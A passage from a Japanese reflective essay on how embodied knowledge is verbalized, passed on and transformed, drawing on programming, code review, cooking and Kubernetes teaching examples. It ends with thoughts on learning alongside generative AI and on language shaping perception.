、人間は複雑な概念を伝達できない。したがって、身体化された知識を伝えるには、一度言語化しなければならない。身体化された知識 → 言語化 → (伝達) → 言語化された知識 → 身体化この変換の連鎖が、必要になる。でも、ここに非対称性がある。身体化された知識を言語化する時、情報が失われる。言語化された知識を身体化する時、新しい情報が生まれる。つまり、変換は可逆ではない。後輩が獲得した身体化された知識は、私が持っている身体化された知識と、同じではない。似ているが、同じではない。これが、知識が形を変える第二の理由だ。伝達のためには、身体化された知識を言語化しなければならないからだ。そして、不完全な伝達が、進化を生むここで、重要な洞察がある。もし知識の伝達が完全なら、知識は進化しない。私の知識が、そのまま後輩にコピーされるなら、後輩は私と全く同じように判断する。新しいものは、何も生まれない。しかし、伝達が不完全だからこそ、変異が生じる。後輩の知識は、私の知識の変異体だ。似ているが、異なる。そして、その違いの中に、新しい可能性がある。後輩は、私が見落としていたパターンに気づくかもしれない。私とは異なる視点から、問題を捉えるかもしれない。そして、後輩が発見した新しいパターンを、私が学ぶこともある。彼が言語化したものを聞いて、「ああ、確かにそうだ」と気づく。私の知識が、更新される。これが、知識が集団の中で進化するメカニズムだ。不完全な伝達 → 変異 → 選択 → 進化生物の進化と、同じ原理だ。これが、知識が形を変える第三の理由だ。不完全な変換こそが、知識の進化を可能にするからだ。翻訳としての言語化ここで、言語化という行為の本質について、もっと深く考えてみたい。言語化は、圧縮ではない。翻訳だ。 ある言語から別の言語に翻訳する時、元の意味をそっくりそのまま伝えることはできない。ニュアンスが変わる。リズムが変わる。文化的な背景が抜け落ちる。身体化された知識を言語化する時も、同じことが起きる。身体的な感覚を、言葉に翻訳する。並列処理を、逐次的な説明に翻訳する。その過程で、何かが変わる。失われるものもあれば、新たに生まれるものもある。失われるのは、細部だ。微妙なニュアンス。タイミング。力加減。文脈。これらは、言葉にした瞬間、抜け落ちる。でも、新たに生まれるものもある。それは、構造だ。関係性だ。パターンだ。身体化された知識のままでは、それは混沌としている。「なんとなく分かる」。でも、言語化することで、構造が見えてくる。「ああ、この判断は、この要素とこの要素を比較しているんだ」「この感覚は、この経験とこの経験から来ているんだ」。言語化は、知識を貧しくする。でも同時に、知識を明晰にする。これが、翻訳の二面性だ。地図という比喩の限界と可能性地図を思い浮かべてほしい。地図は、現実の地形を紙の上に表現したものだ。でも、地図は現実そのものではない。山の高さは誇張されている。細かい凹凸は省略されている。色分けは人工的に決められている。つまり、地図は意図的に歪められた現実だ。でも、その歪みには理由がある。もし地図が現実をそのまま写すなら、地図は現実と同じ大きさになってしまう。それでは、地図の意味がない。地図は、重要な情報を強調し、不要な情報を削ぎ落とすことで、初めて役に立つ。言語化も同じだ。身体化された知識を圧縮して、重要な部分だけを取り出す。その過程で、必然的に情報が失われる。料理のレシピを考えてみよう。「塩を少々」。この「少々」は、どのくらいか。熟練した料理人は、料理の状態を見て、味見をして、瞬時に判断する。今日の湿度は？この食材はいつ仕入れたものか？火加減は適切か？すでに入れた調味料の量は？食べる人の好みは？これらすべてを、無意識に考慮して、「今日のこの料理には、この量」と決める。でも、レシピには「塩小さじ1/4」と書かれる。これは近似値だ。平均値だ。多くの場合にうまくいく、一般化された量だ。しかし、プロの料理人が持っている微細な調整能力は、この数字には含まれていない。これが、言語化された知識の本質だ。個別を一般に変換し、文脈を捨象し、近似値を提示する。この圧縮は、悪いことではない。むしろ、必要なことだ。圧縮しなければ、伝達できない。でも、圧縮によって失われるものがあることを、私たちは忘れてはいけない。マニュアル通りにやっても、プロのようにはできない。教科書を読んでも、実践はうまくいかない。それは、あなたが無能だからではない。言語化された知識には、身体化された知識の一部しか含まれていないからだ。 地図を見ただけでは、実際にその土地を歩いたことにはならない。実践知という第三の形ここで、もう1つの知識の形態について語る必要がある。それは、実践知だ。実践知は、身体化された知識でもなく、言語化された知識でもない。あるいは、両方の性質を持っている。看護師が患者の微細な変化を察知して、即座に対応を変える。教師が生徒の表情を見て、その場で授業の進め方を調整する。エンジニアがコードを書きながら、設計の問題に気づいて修正する。これは、「計画を立てて実行する」という単純な流れではない。「実践しながら観察し、判断し、修正する」というグルグル回る流れだ。この実践の中で働いている知識が、実践知だ。実践知は、身体化された知識の一種だと言える。なぜなら、言語化しきれないから。でも、ただの身体化された知識とは違う特徴がある。それは、その場その場で最善の手を選ぶ判断力だという点だ。言語化された知識は、一般化された知識だ。「こういう状況ではこうする」というルール。マニュアル。教科書。でも、現実の状況は常に複雑で、文脈に依存していて、予測不可能だ。実践知は、その複雑さに対処する。「教科書にはこう書いてあるけど、この状況では違うやり方がいい」「マニュアルではAだけど、今回はBが適切だ」。この判断は、どこから来るのか。それは、過去の経験の蓄積だ。でも、ただの経験ではない。振り返られた経験だ。創発としての量質転化私は、プログラミングを始めた頃のことを思い出す。最初の一ヶ月、私は苦労していた。1つのプログラムを書くのに、何時間もかかった。エラーが出る。理解できない。調べる。試す。また失敗する。二ヶ月目も、同じだった。少し速くなったが、本質的には変わらなかった。三ヶ月目も、同じだった。でも、四ヶ月目に、何かが変わった。突然、コードが「読める」ようになった。以前は意味不明だった構文が、意味を持ち始めた。エラーメッセージが、単なる記号の羅列ではなく、具体的な情報として理解できるようになった。そして、プログラムを書く速度が、劇的に上がった。以前は数時間かかっていたものが、数十分で書けるようになった。何が起きたのか。量的な変化（書いたコードの量、経験したエラーの数）が、ある閾値を超えた時、質的な変化が起きた。これは、相転移に似ている。水を冷やしていく。99度、98度、97度。温度は下がっているが、水は水のままだ。でも、0度で、突然、氷になる。液体から固体へ。状態が変わる。性質が変わる。同様に、学習にも閾値がある。一定量の経験を積むまでは、質的な変化は起きない。同じレベルに留まっている。でも、閾値を超えた瞬間、突然、別のレベルに到達する。なぜこれが起きるのか。それは、パターン認識の閾値だ。パターンが見えるようになる瞬間プログラミングの初心者は、コードを文字の列として見ている。1つ1つの記号を、個別に処理している。でも、経験を積むと、パターンが見えてくる。「ああ、これはループだ」「これは条件分岐だ」「これは関数呼び出しだ」。最初は、意識的にパターンを認識している。「forと書いてあるから、これはループだ」。でも、やがて、パターン認識が自動化される。意識せずに、瞬時に、パターンが見える。そして、さらに経験を積むと、より高次のパターンが見えてくる。「これはIteratorパターンだ」「これはStrategyパターンだ」。個々の構文ではなく、設計のパターンが見える。この段階的なパターン認識の獲得が、質的な変化を生む。でも、パターンは、一定量の事例を見ないと、認識できない。3つの事例からは、パターンは見えない。しかし、三十の事例を見れば、パターンが浮かび上がる。これが、量が質を生むメカニズムだ。しかし、ここで重要なのは、ただ量をこなすだけでパターンが見えるわけではないということだ。振り返りという、パターンを可視化する行為私がプログラミングを学んだ四ヶ月目、何が起きたのか。私は、ただコードを書いていたわけではない。書いては、振り返っていた。「なぜこのエラーが出たのか」「このコードは、前に書いたコードと、どう違うのか」「この解決策は、他の問題にも使えるか」。この振り返りが、パターンを可視化した。最初は個々の問題が別々に見えていた。でも、振り返ることで共通点が見えてきた。「ああ、このエラーとあのエラーは実は同じ原因だ」「この解決策はあの問題にも使える」。パターンは、事例の中に潜んでいる。でも、振り返らないと、見えない。私の知り合いに、二人のエンジニアがいた。一人目は、十年間、同じような機能を実装し続けた。でも、彼のスキルは、ほとんど向上しなかった。なぜなら、彼は経験を振り返らなかったからだ。ただ繰り返した。同じやり方で。同じミスで。「忙しいから仕方ない」と言って。二人目は、三年で驚くほど成長した。なぜなら、彼は毎回、振り返ったからだ。「なぜこの設計にしたのか」「もっと良い方法はなかったか」「次回はどう改善できるか」。たった十分の振り返りを、毎日続けた。この差が、実践知の蓄積を決める。経験の「量」ではない。経験の「質」だ。そして、質を決めるのは、振り返りの深さだ。振り返りの三つの深度振り返りにも、レベルがある。表面の振り返り：何が起きたか「今日は、このコードを書いた」「このエラーが出た」「これができた」。これは、記録だ。振り返りではない。中層の振り返り：なぜそれが起きたか「なぜこのエラーが出たのか。型の不一致が原因だ」「なぜこの設計にしたのか。拡張性を考慮したからだ」。これは、因果の理解だ。振り返りの始まりだ。でも、まだ不十分だ。深層の振り返り：パターンは何か「この型エラーは前に経験したあのエラーと同じパターンだ」「この設計の判断は一般化できる原則に基づいている」「この原則は他の状況でも適用できる」。これが、本当の振り返りだ。個別の事例から、一般的なパターンを抽出する。そのパターンを、次の実践で使う。そして、このパターンの抽出こそが、量を質に変換するメカニズムだ。でも、ここで最後の要素が必要になる。それは、目的意識だ。目的意識という、方向性を与えるもの量をこなし、振り返る。これだけでは、まだ不十分だ。なぜなら、方向性がないからだ。パターンを見つけることはできる。でも、そのパターンが、本当に重要なパターンなのか。自分が達成しようとしていることに、関連しているのか。これを判断するには、目的が必要だ。私は、なぜコードを書いているのか。何を達成しようとしているのか。どんな問題を解決しようとしているのか。この目的があって初めて、パターンに優先順位がつく。「このパターンは重要だ。なぜなら、私が解決しようとしている問題に直接関係しているからだ」「このパターンについて、今は重要性が低い」。目的のない量は、ただの反復だ。目的のない振り返りは、ただの分析だ。でも、目的のある量は、訓練だ。目的のある振り返りは、学習だ。そして、目的を持った大量の実践と深い振り返りが組み合わさった時、創発が起きる。突然、新しいレベルの理解が生まれる。これが、量質転化の正体だ。言語化という、形を探す運動ここまで、知識がなぜ形を変えるのか、そしてどのように質的な変化が起きるのかを見てきた。ここで、もう一度「言語化」という行為の本質に戻ろう。観察が先、言語は後「言語化」という言葉を聞くと、多くの人は語彙力や表現力を思い浮かべる。どんな言葉を使うか。どう説明するか。文章の構成は。でも、それは順序が違う。言語化の質を決めるのは、対象をいかに的確に、解像度高く観察しているか、だ。言語能力は、その次の段階に過ぎない。観察が粗ければ、どれだけ豊富な語彙を持っていても、的確な言語化はできない。「美味しい」という感想しか持てない人が、いくら言葉を知っていても、味の繊細な描写はできない。なぜなら、味覚体験そのものが、解像度が低いからだ。逆に、対象を精密に観察できている人は、限られた語彙でも、本質を捉えた説明ができる。なぜなら、何を伝えるべきかが明確に見えているからだ。言語化が上手い人は、全てを説明しようとしていない。彼らは何をしているのか。彼らは、自分の中にある言い表せない状態に、近い形のものを探している。これは、靴を探すことに似ている。あなたの足には、固有の形がある。そして、その形に合う靴を探す。完璧にフィットする靴は、たぶん存在しない。でも、近いものを探す。試着する。歩いてみる。「これは、まあまあ合っている」「これは、ちょっと違う」。言語化も同じだ。私の中には、まだ形になっていない感覚がある。モヤモヤとした違和感。言葉にならない直感。輪郭のない不安。これらに、言葉という既製の形を、当ててみる。「これは、不安だ」。試してみる。でも、何か違う。「これは、焦燥感だ」。これも、少し違う。「これは、無力感だ」。近い。でも、まだ足りない。「状況をコントロールできないという認識と、それでも何かしなければという焦燥感が、混ざっている」。ああ、これだ。完璧ではない。でも、かなり近い。重要なのは、この過程で、私は既存の言葉の中から探している、ということだ。新しい言葉を作り出すのではない。すでにある言葉の中から、自分の状態に最も近いものを見つけ出す。組み合わせる。そして、見つけた瞬間、不思議なことが起きる。自分の状態が、少し明確になる。言葉という形を与えることで、形のなかった感覚が、輪郭を持ち始める。抽象と具体を往復する運動優れた言語化は、抽象化と具体化を往復する。まず、抽象化する。「この感覚は、不安だ」。次に、具体化する。「具体的には、胸の中心が空洞になったような感覚がある。そして、肩が内側に引っ張られる緊張がある」。そして、再び抽象化する。「待って、これは不安というより、無力感に近い」。さらに、具体化する。「状況をコントロールできないという認識がある。そして、それでも何かしなければという焦燥感がある。この2つが混ざっている」。この往復を繰り返すことで、経験の解像度が上がる。最初は1つの塊だったものが、複数の要素に分解される。そして、各要素は、さらに細かく分解可能だと分かる。これは、顕微鏡で細胞を見る行為に似ている。最初は、ぼんやりとした塊しか見えない。でも、倍率を上げていくと、構造が見えてくる。核がある。細胞膜がある。ミトコンドリアがある。さらに倍率を上げると、それぞれの構造に、さらに細かい構造があることが分かる。言語化も同じだ。抽象と具体を往復させることで、経験の構造が見えてくる。そして、構造が見えることで、理解が深まる。解像度という、観察の精度言語化の質を決めるのは、語彙の量ではない。観察の質だ。コーヒーを飲んで「苦い」と言う人がいる。別のバリスタは、こう言う。「最初の舌触りは滑らかだ。でも、飲み込む瞬間に、舌の奥に残る感覚がある。焦げた木のような渋みだ」。この違いは、語彙力の違いではない。バリスタは、より精密に味覚を観察している。味覚の時間的な展開に注意を向けている。複数の感覚——舌触り、味、後味——を分離して認識している。そして、その精密な観察を、既存の言葉で表現している。「焦げた木」は、比喩だ。でも、的を射た比喩だ。なぜなら、実際の味覚体験に、かなり近いからだ。言語化力は、語彙力ではなく、世界を解像度高く捉える力が本質だ。ただし、観察は、決して絶対ではない。 私たちが何を見るかは、私たちが何を知っているかに依存する。「単一責任の原則」という概念を学ぶ前と後では、同じコードを見ても、見えるものが違う。観察とは、背景にある知識や理論を前提として行われる。そして、この観察の質を高めるには、どうすればいいか。練習だ。意識的な練習だ。毎日飲むコーヒーを、本当に味わう。「美味しい」で終わらせない。どこが美味しいのか。最初の一口は？二口目は？冷めてきた時は？苦味は？酸味は？香りは？舌触りは？温度の変化は？毎日見る景色を、本当に見る。「綺麗だ」で終わらせない。何が綺麗なのか。光の角度は？色の組み合わせは？空間の奥行きは？影の形は？風の音は？毎日書くコードを、本当に読む。「動く」で終わらせない。なぜ動くのか。どこが良いのか。どこが改善できるのか。この変数名は適切か？この関数の責務は明確か？このロジックは直感的か？この意識的な観察の積み重ねが、言語化の質を高める。語彙は、その後についてくる。世界の広がりという錯覚プログラミングを始めたばかりの頃、私は圧倒されていた。学ぶべきことが、あまりにも多すぎる。プログラミング言語、フレームワーク、デザインパターン、アルゴリズム、データ構造、アーキテクチャ、セキュリティ、パフォーマンス。リストは、どこまでも続く。世界は、恐ろしく広い。そう思っていた。でも、十年以上経った今、私は気づいた。世界は、広くなかったのだと。いや、正確に言えば、世界が広いという感覚は、錯覚だった。新しい領域が無限に広がっているのではない。既に知っている領域の解像度が、無限に細かくなっていくだけだった。最初、私にとってプログラミングは1つの塊だった。「コードを書く」。これが、私の世界のすべてだった。でも、少し経験を積むと、その塊が分解され始めた。「変数」「関数」「ループ」「条件分岐」。4つになった。さらに経験を積むと、それぞれがさらに分解された。「関数」は、「純粋関数」「副作用を持つ関数」「高階関数」に分かれた。そして今、私が「関数」を見る時、見えているものは何百もの要素の複合体だ。関数名の適切性、引数の数と型、戻り値の明確性、副作用の有無、テスタビリティ、再利用性、パフォーマンス特性、エラーハンドリング、境界条件の処理。これらすべてを、瞬時に、並列に処理している。世界は広がっていない。ただ、見えるものが増えているだけだ。コードレビューを例に考えてみよう。プログラミングを始めたばかりの人は、コードを「動く」か「動かない」かで判断する。2つ。少し経験を積むと、「読みやすい」「読みにくい」を加える。3つか4つ。さらに経験を積むと、もっと細かく見る。「変数名は適切か」「関数は単一責任か」「エラーハンドリングは十分か」。数十の観点。でも、経験を重ねたエンジニアは、そこで止まらない。同じ「変数名」でも、スコープの広さによって適切な抽象度が違う。同じ「関数」でも、ドメインの文脈によって適切な粒度が違う。同じ「エラーハンドリング」でも、システムの信頼性要件によって必要な厳密さが違う。そして、これらすべてが相互に影響し合っている。区別の数は、無限に増えていく。これは、世界が広がっているのではない。世界の解像度が、上がっているのだ。初学者の目には、コードは大きな塊に見える。でも、経験を積んだエンジニアの目には、無数の細かい要素の集合として見える。同じコードを見ている。でも、見えている粒度が、まったく違う。そして、重要なのは、この解像度の向上に、終わりがないということだ。どれだけ専門性を深めても、さらに細かい区別が見えてくる。どれだけ経験を積んでも、見落としていた微細な違いに気づく。「ああ、今まで同じだと思っていたこの2つのアプローチは、実は違ったのか」。専門家になることは、広い世界を制覇することではない。1つの領域を、無限に細かく見ることができるようになることだ。コードの向こうに見える世界そして、さらに経験を重ねると、もう1つの変化が起きる。コードの向こうに、人間が見えるようになる。しかし、私が見ている「人間」は、客観的な事実ではない。あくまでも私の解釈だ。観察者の視点や意味づけによって、同じ対象は異なって見える。 同じコードを見ても、あるレビュアーは「急いでいる」と解釈し、別のレビュアーは「経験が浅い」と解釈する。バックエンドエンジニアとフロントエンドエンジニアでは、気になる点が違う。それぞれが、自分の専門性という枠組みやナラティブを通して、世界を観察しているからだ。最初、私にとってコードは、ただのテキストだった。構文。ロジック。データ構造。技術的な要素だけが見えていた。でも、数年経つと、コードの書き方から、書いた人の思考プロセスが見えるようになった。「この人は、パフォーマンスを重視している」「この人は、保守性を大切にしている」「この人は、急いでいる」。コードは、人の痕跡だ。さらに経験を積むと、その人が置かれている状況も見えてくる。「このチームは、テストを書く文化がないのかもしれない」「この組織は、技術的負債を抱えているな」「このプロジェクトは、納期のプレッシャーがあったんだろう」。コードレビューで、私は今、こんなことを同時に見ている。技術的な側面：「この関数は責任が多すぎる」「このデータ構造は非効率だ」「このエラーハンドリングは不十分だ」。人間的な側面：「この実装者は、この概念を理解しきれていない」「でも、一生懸命考えた跡がある」「この質問の仕方なら、防御的にならずに受け入れてくれるかもしれない」。組織的な側面：「このコードの品質から、チームに時間的余裕がないことが分かる」「テストがないのは、テスト文化がないからだ」「リファクタリングの提案は、今は受け入れられないかもしれない」。ビジネス的な側面：「この機能の優先度は高いから、完璧を求めすぎると納期に影響する」「でも、この部分は後で拡張する可能性が高いから、今直しておくべきだ」「この技術的負債は、半年後のリソース計画に影響する」。同じコードを見ているのに、見えている世界の次元が、まったく違う。初心者は、コードを見る。1次元だ。少し経験を積むと、コードと設計を見る。2次元だ。さらに経験を積むと、コードと設計と、それを書いた人が見える。3次元だ。そして、十分に経験を積むと、コードと設計と人と、その人が置かれている組織と、その組織が抱えているビジネスの制約が、同時に見える。多次元だ。これらすべてが、相互に影響し合っている。技術的に最適な解決策が、組織の成熟度的に実現不可能なこともある。ビジネス的に正しい判断が、技術的な負債を生むこともある。人間関係の問題が、コードの品質に表れることもある。新人の頃、私は純粋に技術的な判断をしていた。「このコードは良い」「このコードは悪い」。白か黒か。でも今、私の判断は、常に文脈に依存している。「このチームの現在の状況を考えると、このコードは許容範囲内だ」「この納期とビジネスの重要性を考えると、今はこの技術的負債を受け入れるべきだ」「でも、次のスプリントで必ずリファクタリングする時間を確保しよう」。解像度が上がるとは、細かく見えるようになることだけではない。複数の次元を、同時に見えるようになることだ。そして、これらの次元の中でバランスを取る判断ができるようになることだ。技術だけを見ていた時は、判断は単純だった。でも、人間と組織とビジネスが見えるようになると、判断は複雑になる。トレードオフだらけだ。完璧な答えはない。「状況による」が増える。言語化の困難さの本質私がコードレビューで後輩に指摘していたことを思い出す。「この変数名は、意図が伝わりにくい」。後輩には、変数名は変数名だった。1つの塊だった。でも、私の目には、変数名は複数の要素の複合体として見えていた。長さ、具体性、文脈との整合性、ドメイン用語の使用、省略の適切性、一貫性、発音のしやすさ。私は、新しい知識を持っていたのではない。同じ対象を、より細かく見ることができただけだ。これが、「なんとなく分かる」の正体だ。初心者は、粗い解像度で世界を見る。だから、判断に時間がかかる。意識的に、1つずつ、要素を確認しなければならない。でも、経験を積むと、解像度が上がる。同時に、多数の要素を見ることができる。そして、パターンが見える。「ああ、このコードは、あのパターンだ」。瞬時に、無意識に。解像度が上がると、判断が速くなる。そして、「なんとなく分かる」状態になる。ここで、言語化の問題に戻ろう。解像度が低い時は、言語化が容易だ。「このコードは動く」。1つの特徴を、1つの言葉で表現できる。でも、解像度が上がると、言語化が困難になる。数百の特徴を、どうやって言葉にするのか。技術的な側面だけでなく、人間的な配慮、組織の文脈、ビジネスの制約。これらすべてを、どうやって一度に説明するのか。1つずつ列挙すれば、膨大な説明になる。でも、それでもまだ、すべては言語化できない。だから、専門家は「なんとなく」と言う。言語化しきれないから。でも、これは知識の欠如ではない。知識の豊富さの表れだ。見えているものが多すぎて、言語という1次元のメディアに、すべてを押し込めることができないだけだ。そして、ここで1つの逆説が生まれる。世界を深く知れば知るほど、言語化が困難になる。初心者は、自信を持って説明できる。なぜなら、見えているものが少ないから。すべてを言語化できる。でも、専門家は、躊躇する。「これは複雑で...」「一概には言えなくて...」「状況によるんだけど...」。なぜなら、見えているものが多すぎるから。例外を知っているから。文脈の重要性を知っているから。技術、人間、組織、ビジネスという複数の次元を見ているから。そして、それぞれの次元で、異なる評価軸があることを知っているから。これは、専門家が曖昧だからではない。専門家の見ている世界の解像度が、言語の解像度を超えているからだ。新人が「このコードは動きます」と自信を持って言う。技術的な次元しか見ていないから、判断は明快だ。でも、ベテランが「状況によりますが...」と前置きする。なぜなら、技術、人間、組織、ビジネスという複数の次元を見ているから。世界は、複数の次元に広がっている。専門性を深めることは、これらの次元を同時に見られるようになることだ。段階的な解像度の向上だから、教育には段階が必要だ。最初は、粗い解像度で教える。「このシステムは、Kubernetesで動いています」。次に、少し解像度を上げる。「Deploymentを使っていて、レプリカ数は3です」。さらに解像度を上げる。「リソース制限を設定していて、requestsはCPU 100m、メモリ128Mi。limitsはCPU 200m、メモリ256Miです。Liveness ProbeとReadiness Probeも設定していて...」。でも、本当はもっと細かい。なぜこのリソース値なのか。requestsとlimitsの比率をこうした理由は。QoSクラスへの影響を理解しているか。Probeの初期遅延とタイムアウトの設定根拠は。PodDisruptionBudgetは。Affinityルールは。PriorityClassは。HPAとVPAの使い分けは。ノードのリソース圧迫時の挙動は。そして、なぜこのインフラ構成を選んだのか。組織のスキルセットは。予算の制約は。ビジネスの成長見込みは。これら無数の判断が、「レプリカ数は3です」という一言の背後にある。徐々に、徐々に、解像度を上げていく。一度にすべてを伝えようとしない。なぜなら、受け手の解像度も、段階的にしか上がらないから。これが、知識の伝達が時間を要する理由だ。情報の量の問題ではない。解像度の問題だ。そして、次元の問題だ。受け手の世界の解像度が上がるまで、細かい区別は伝えられない。受け手が複数の次元を同時に見られるようになるまで、多次元的な判断は共有できない。世界は、広くない。ただ、解像度が無限にある。そして、複数の次元がある。そして、専門性を深めることは、この解像度を上げ続けることだ。そして、見える次元を増やし続けることだ。終わりはない。どこまで行っても、さらに細かい区別が見えてくる。新しいパターンが見えてくる。見落としていた微細な違いに気づく。そして、新しい次元が見えてくる。これが、学びに終わりがない理由だ。世界が無限に広いからではない。世界の解像度が、無限に細かくなっていくからだ。そして、世界は、複数の次元で構成されているからだ。言語化すると価値が失われるものでも、ここで立ち止まって考えるべきことがある。言語化すると、価値が失われるものがある。職人の手に染み込んだ技術。音楽家の指が覚えている感覚。アスリートの瞬時の判断。料理人の微妙な味の調整。これらを無理に言語化しようとすると、何が起きるか。技術が、死ぬ。職人が、自分の技を言語化しようとする。「まず、木目を見て、ここに刃を入れて...」。でも、説明している間に、職人は気づく。自分が本当にやっていることは、これじゃない。もっと微妙で、もっと複雑で、もっと直感的だ。そして、説明に従って作業をすると、うまくいかない。なぜなら、言語化した瞬間、技術の本質が抜け落ちているからだ。音楽家が、自分の演奏を分析しようとする。「この音は、もっと強く。このタイミングで、指を...」。でも、分析している間に、音楽が死ぬ。音楽は、分析の対象ではない。流れだ。感情だ。身体と楽器の一体化だ。それを言葉にした瞬間、ただの技術的な指示になる。言語化は、対象を固定する。でも、固定された瞬間、生命が失われる。これが、言語化の暴力性だ。言語化は、流れているものを止める。動いているものを固定する。生きているものを標本にする。そして、標本は、生きている生物ではない。ムカデの寓話がある。ムカデは、何百本もの足を完璧に協調させて歩いている。ある日、「どの足から動かしているのか」と聞かれた。ムカデは考え始めた。そして、歩けなくなった。意識化は、時に機能を破壊する。言語化は、時に価値を失わせる。だから、すべてを言語化しようとしてはいけない。言語化できないものを、無理に言語化してはいけない。そして、言語化すると価値が失われるものは、言語化せずに、そのまま保存すべきだ。沈黙にも、価値がある。曖昧さにも、価値がある。矛盾にも、価値がある。言葉にならない何かにも、価値がある。いや、むしろ、言葉にならないからこそ、価値がある。言語化すべきものと、すべきでないものでは、何を言語化すべきか。私の考えはこうだ。他者との協働を可能にするものを、言語化すべきだ。ここで言う「他者」には、未来の自分も含まれる。半年後、一年後の自分は、もはや別人だ。今の文脈も、今の意図も、驚くほど忘れている。だから、未来の自分のために言語化する。それは、時間を超えた協働だ。一人で自転車に乗る限り、乗り方を言語化する必要はない。でも、他人に教えようとすれば、ある程度の言語化が必要になる。その言語化は、不完全だ。言語化されたルールだけでは、自転車には乗れない。でも、まったく無言で教えることも、困難だ。言語は、身体的な模倣と試行錯誤を、補完する。「もっと前を見て」「ペダルに力を入れて」。こういう言葉が、学習を助ける。コードも同様だ。一人でプロジェクトを進めるなら、最小限のコメントで済む。しかし、チームで開発するなら、設計意図、トレードオフ、制約条件を言語化する必要がある。その言語化は、コード自体をすべて語るわけではない。でも、それはチームメンバーがコードを理解し、うまく修正するための、補助線となる。「このクラスは、将来的に拡張する可能性があるため、interfaceを定義している」。この一行のコメントが、半年後の自分や他のメンバーを助ける。つまり、言語化は、独立した目標ではない。それは、協働のためのインターフェースだ。したがって、必要な言語化の量と精度は、協働の必要性によって決まる。全てを言語化する必要はない。ただ、共有すべきものを、共有可能な形式で提示できればよい。そして、言語化すべきでないものもある。個人的な感覚。創造的な直感。美的な判断。フロー状態。無意識の判断。これらは、言語化すると、かえって失われる。これは私の実感だが、感覚的に掴んでいたものを、誤った言語化をしてしまって失われた経験がある。うまく説明できない「何か」を無理やり言葉にした瞬間、その繊細なニュアンスが消えてしまった。言語化という行為が、対象を固定し、単純化し、本質を取りこぼす。そういうことが、ある。だから、言語化のタイミングが重要だ。実践の最中には、言語化しない。ただ、流れに身を任せる。自転車に乗りながら、乗り方を考えない。コードを書きながら、書き方を分析しない。演奏しながら、指の動きを意識しない。でも、実践の後に、振り返る。「なぜうまくいったのか」「何が違ったのか」「次回はどう改善できるか」。これが、行為の中の省察と、行為についての省察の違いだ。行為の中では、言語化しない。でも、行為の後に、言語化する。そして、その言語化が、次の実践を導く。ただし、その言語化さえも、慎重であるべきだ。すべてを言葉にしようとしない。言葉にできるものだけを、言葉にする。そして、言葉にならない部分の存在を、認める。生成AI時代における知識の変容ここで、現在の文脈に話を戻そう。生成AIの登場は、知識の変容プロセスに、何をもたらしたのか。AIは、スピードと量を劇的に増やした。コードを書く速度。試せるアプローチの数。生成できるバリエーションの数。これは、パターン認識の閾値に到達するまでの時間を、劇的に短縮する可能性がある。以前なら数ヶ月かかっていた量を、数日で経験できる。でも、ここで重要なのは、ただ量をこなすだけでパターンが見えるわけではないということだ。AIが生成したコードを見る。動かす。次のコードを生成する。また動かす。このサイクルを高速で回すことはできる。しかし、振り返りがなければパターンは見えない。量が増えても、振り返りがなければ、質的な変化は起きない。閾値は超えられない。これが、生成AI時代における人間の役割だ。AIが生成したコードを、振り返る。なぜこのコードが動くのか。どのパターンを使っているのか。このパターンは、他の問題にも使えるか。このアプローチの限界は何か。この振り返りを通じて、AIが提供した量を、自分の質に変換する。そして、もう1つ重要なのは、目的意識だ。AIは、膨大な可能性を提示する。でも、その中から、何を選ぶか。どの方向に進むか。これを決めるのは、人間だ。目的がなければ、AIが生成する大量の選択肢の中で、迷子になる。でも、明確な目的があれば、AIは強力な探索ツールになる。「こういう問題を解決したい」「こういう制約の中で、最適なアプローチを探している」。この目的を持って、AIと対話する。つまり、生成AI時代において、知識の変容プロセスは、こうなる。AIが量を提供する → 人間が振り返る → パターンが見える → 質的な変化が起きる → 身体化された知識が更新される → より高度な目的を持って、AIに問いかける → さらに多くの量を経験する → より深い振り返り → ..この循環が、新しい学習のサイクルだ。でも、ここで注意すべきことがある。AIが生成するものは、言語化された知識だ。コードも、説明も、提案も、すべて言語の形をしている。これを身体化された知識に変換するには、実践が必要だ。AIが提案したコードを、実際に使ってみる。動かしてみる。失敗してみる。修正してみる。この実践の中で、初めて、言語化された知識が身体化される。AIは、言語化された知識へのアクセスを、劇的に増やした。でも、身体化のプロセスは、依然として人間の中で起きる。そして、そのプロセスには、時間がかかる。だから、AIを使っても、学習の本質的なプロセスは変わらない。言語化された知識 → 実践 → 振り返り → パターン抽出 → 身体化された知識このサイクルは、依然として人間の中で回る。AIは、このサイクルの速度を上げる。でも、サイクルを飛ばすことはできない。人間は言葉を通して世界を認識している「言語化」という言葉が隠している前提最後に、根本的な問いに戻ろう。そもそも、言語化する前の思考は、存在するのか。私が「今日は疲れた」と思う時、その「疲れた」という感覚は、「疲れた」という言葉より先に存在しているのか。それとも、「疲れた」という言葉があるから、この身体のだるさを「疲れ」として認識できているのか。考えれば考えるほど、分からなくなる。ここで、「言語化」という言葉そのものについて、考えてみたい。この言葉には、ある前提が潜んでいる。「言語にする以前から、その感覚や対象が存在した」という前提だ。まず感覚がある。それを、言葉という容器に移し替える。これが「言語化」だと。この理解では、言語はツールだ。すでに存在する何かを、伝達可能な形式に変換するための道具。でも、言語にはもう1つの側面がある。「語られて初めて、その対象が見える」という側面だ。言語の持つ「ツール的性質」は重視される。でも、「世界の開示」という性質は、忘れられがちだ。言語が世界を切り分けるたとえば、ある文化には、雪を表す言葉が数十種類ある。粉雪、湿った雪、固まった雪、解けかけの雪。それぞれに違う言葉がある。これを聞いた時、私たちは通常こう考える。「彼らは雪の細かい違いを認識できるから、言葉がある」。つまり、認識が先、言葉が後だと。でも、逆なのだ。言葉があるから、違いを認識しやすくなる。言語は、世界を分割する。その分割線は、恣意的だ。でも、一度引かれると、私たちの認識を構造化する。日本語には「木漏れ日」という言葉がある。木の葉の隙間から差し込む光。英語には、対応する単一の言葉がない。\\"sunlight filtering through 